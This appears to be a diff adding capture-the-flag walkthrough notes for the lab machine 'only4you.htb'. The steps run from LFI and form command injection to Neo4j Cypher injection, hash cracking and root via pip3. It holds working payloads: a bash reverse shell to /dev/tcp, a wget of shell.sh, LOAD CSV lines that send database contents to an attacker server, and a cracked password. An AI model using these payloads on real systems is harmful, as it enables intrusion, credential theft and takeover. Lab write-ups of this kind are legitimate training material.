@@ -1,0 +1,94 @@
+The main website is not interactive, running a subdomain search there is a beta
+info@only4you.htb -> bottom of site with Contact with a form
+
+In beta.only4you.htb is a link to download the source-code:
+	from examining the source code in the download path, there is
+	a check for LFI attempts with by checking if the string
+	contains .., ../, AND checks for absolute path meaning
+	file:// doesnt work!
+
+lfi.py shows a demonstration on how the code is reading the image var
+in the post req to download!
+
+starting the file= with /../ makes it so if you try /../../etc/passwd
+it outputs /etc/passwd into the system which then gives us that file!
+
+/var/www/only4you.htb/app.py -> from form import [function] -> like namespaces in C#
+/var/www/only4you.htb/form.py
+
+the form seems to be exploitable to run shell commands
+
+noreply@only4you.htb | /bin/bash -i >& /dev/tcp/10.10.14.66/4444 0>&1
+
+john%40only4you.htb+|+wget+http://10.10.14.37:80/shell.sh
+john%40only4you.htb+|+/bin/bash+shell.sh -> hand-craft value with url encoding
+
+netstat -ntlp -> this shows all the ports listening on the machine
+---------------------------------------------------------------------
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address      PID/Program name    
+tcp        0      0 127.0.0.53:53    - Domain
+tcp        0      0 0.0.0.0:22      - SSH
+tcp        0      0 127.0.0.1:3000      - ???
+tcp        0      0 127.0.0.1:8001      - ???
+tcp        0      0 127.0.0.1:33060      - ???
+tcp        0      0 127.0.0.1:3306      - MySQL
+tcp        0      0 0.0.0.0:80   -   Website
+tcp6       0      0 :::22      - ???
+tcp6       0      0 :::8000      50067/./chisel -> Chisel can be useful
+tcp6       0      0 127.0.0.1:7687      - Neo4j
+tcp6       0      0 127.0.0.1:7474      - Neo4j
+---------------------------------------------------------------------
+
+Using Chizel we can port-forward from target to attacker:
+
+chisel server -reverse -p 8000 -> Attacker
+chisel client [serverIP:serverPort] R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001 R:7687:127.0.0.1:7687 R:7474:127.0.0.1:7474 R:33060:127.0.0.1:33060
+
+attacker:3000 -> target:3000 : how the port-forward looks
+This will establish a port-forward from the AttackerPort:localhost:localhostPort
+
+After establishing the chisel connections, we can run nmap against localhost and see what we now have access too, or we can manually enum what service the ports are used for via google
+
+port 8001 routes us to a login page where we can use admin:admin to get logged
+this also tells us after auth, they are using NEO4J, hacktricks.xyz has
+useful documentation about running injections to dump the server
+
+https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j
+
+' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.37:80/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
+
+version=5.6.0&name=Neo4j Kernel&edition=community
+
+' OR 1=1 WITH 1 as a  CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.37:80/?l='+label as l RETURN 0 as _0 //
+
+l=user
+l=employee
+
+' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.37:80/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+
+username=john
+password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+
+username=admin
+password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
+
+john can crack multiple hashes in a file:
+john --wordlist=/usr/share/wordlists/rockyou.txt john.hash --format=Raw-SHA256
+
+After cracking you can have john show you the cracked hashes:
+john --show --format=Raw-SHA256 john.hash
+
+?:admin
+?:ThisIs4You -> johns ssh password
+
+user:6b9cbe77ebb86336f68306bcd00ee9b2
+
+running sudo -l we can run as ROOT a pip3 download:
+User john may run the following commands on only4you:
+    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
+
+in the Test repo we can add files to it and make it public
+using the command:
+/usr/bin/pip3 download [link supplied when hovering over see raw]
+the pip3 acts funny and executes the code inside the tar.gz as root allowing us to chmod u+s /bin/bash so we can then priv esc to root via /bin/bash -p
